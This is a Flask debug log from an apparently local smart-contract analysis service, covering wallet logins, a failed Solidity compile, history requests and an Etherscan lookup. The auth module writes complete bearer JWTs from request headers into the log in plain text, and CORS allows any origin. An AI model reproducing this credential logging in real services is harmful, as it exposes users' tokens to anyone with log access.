2025-06-23 10:47:46,279 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:47:46,286 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:47:46,294 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:47:46,299 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 10:47:46,305 - werkzeug - INFO - 172.21.0.1 - - [23/Jun/2025 10:47:46] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 10:47:46,319 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 10:47:46,321 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NzgzOTV9.xCOLnQrRpKyf3NKrsLsaaAg1S4lyU1rZE6_CzkeRSv0', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 10:47:46,324 - app.api.auth - INFO - Request content type: application/json
2025-06-23 10:47:46,326 - app.api.auth - INFO - Processing JSON request
2025-06-23 10:47:46,329 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 10:47:46,801 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 10:47:46,804 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:47:46,806 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:47:46,807 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:47:46,808 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 10:47:46,810 - werkzeug - INFO - 172.21.0.1 - - [23/Jun/2025 10:47:46] "POST /login HTTP/1.1" 200 -
2025-06-23 10:49:01,424 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 10:49:01,603 - app.app - INFO - Application started
2025-06-23 10:49:01,616 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.23.0.5:8000
2025-06-23 10:49:01,617 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 10:49:02,569 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 10:49:02,574 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NzkyNjZ9.feGJ5XEWn2k5SZVb4F3sS5r_W6_wF0CcZCODTganaL0', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 10:49:02,576 - app.api.auth - INFO - Request content type: application/json
2025-06-23 10:49:02,578 - app.api.auth - INFO - Processing JSON request
2025-06-23 10:49:02,580 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 10:49:03,056 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 10:49:03,062 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:49:03,065 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:49:03,068 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:49:03,070 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 10:49:03,073 - werkzeug - INFO - 172.23.0.1 - - [23/Jun/2025 10:49:03] "POST /login HTTP/1.1" 200 -
2025-06-23 10:49:09,714 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:49:09,723 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:49:09,727 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:49:09,731 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 10:49:09,737 - werkzeug - INFO - 172.23.0.1 - - [23/Jun/2025 10:49:09] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-23 10:49:09,759 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 10:49:09,769 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 10:49:09,780 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 10:49:09,784 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpqn23gfw5.sol
2025-06-23 10:49:09,791 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 10:49:09,792 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 10:49:09,802 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-06-23 10:49:09,804 - app.services.contract_service - WARNING - No contracts compiled
2025-06-23 10:49:09,805 - app.services.contract_service - INFO - Temporary file /tmp/tmpqn23gfw5.sol removed
2025-06-23 10:49:09,807 - app.api.contract - WARNING - No valid Solidity contract found in the provided code
2025-06-23 10:49:09,809 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:49:09,810 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:49:09,811 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:49:09,813 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 10:49:09,814 - werkzeug - INFO - 172.23.0.1 - - [23/Jun/2025 10:49:09] "[31m[1mPOST /analyze HTTP/1.1[0m" 400 -
2025-06-23 10:49:14,470 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:49:14,475 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:49:14,478 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:49:14,481 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 10:49:14,488 - werkzeug - INFO - 172.23.0.1 - - [23/Jun/2025 10:49:14] "OPTIONS /history HTTP/1.1" 200 -
2025-06-23 10:49:14,547 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:49:14,549 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:49:14,550 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:49:14,552 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 10:49:14,555 - werkzeug - INFO - 172.23.0.1 - - [23/Jun/2025 10:49:14] "GET /history HTTP/1.1" 200 -
2025-06-23 10:49:26,595 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 10:49:26,599 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 10:49:26,601 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 10:49:26,604 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 10:49:26,607 - werkzeug - INFO - 172.23.0.1 - - [23/Jun/2025 10:49:26] "GET /history HTTP/1.1" 200 -
2025-06-23 13:56:14,497 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 13:56:14,680 - app.app - INFO - Application started
2025-06-23 13:56:14,692 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.27.0.5:8000
2025-06-23 13:56:14,694 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 13:56:20,490 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 13:56:20,496 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 13:56:20,503 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 13:56:20,506 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 13:56:20,511 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 13:56:20] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 13:56:20,523 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 13:56:20,525 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NzkzNDN9.dtL3Nw5mHAx3ttV5GVAVSoI2JzTHdjSECpZtgDDQTqc', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '39', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 13:56:20,526 - app.api.auth - INFO - Request content type: application/json
2025-06-23 13:56:20,527 - app.api.auth - INFO - Processing JSON request
2025-06-23 13:56:20,530 - app.api.auth - INFO - Attempting to authenticate user with wallet: user
2025-06-23 13:56:20,610 - app.api.auth - WARNING - Invalid credentials for wallet: user, error: Invalid credentials
2025-06-23 13:56:20,613 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 13:56:20,614 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 13:56:20,616 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 13:56:20,618 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 13:56:20,620 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 13:56:20] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-23 13:56:26,474 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 13:56:26,480 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NzkzNDN9.dtL3Nw5mHAx3ttV5GVAVSoI2JzTHdjSECpZtgDDQTqc', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 13:56:26,483 - app.api.auth - INFO - Request content type: application/json
2025-06-23 13:56:26,486 - app.api.auth - INFO - Processing JSON request
2025-06-23 13:56:26,491 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 13:56:26,906 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 13:56:26,910 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 13:56:26,912 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 13:56:26,913 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 13:56:26,915 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 13:56:26,917 - werkzeug - INFO - 172.27.0.1 - - [23/Jun/2025 13:56:26] "POST /login HTTP/1.1" 200 -
2025-06-23 13:57:10,932 - flask_cors.extension - DEBUG - Request to ''/etherscan/0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 13:57:10,940 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 13:57:10,944 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 13:57:10,947 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
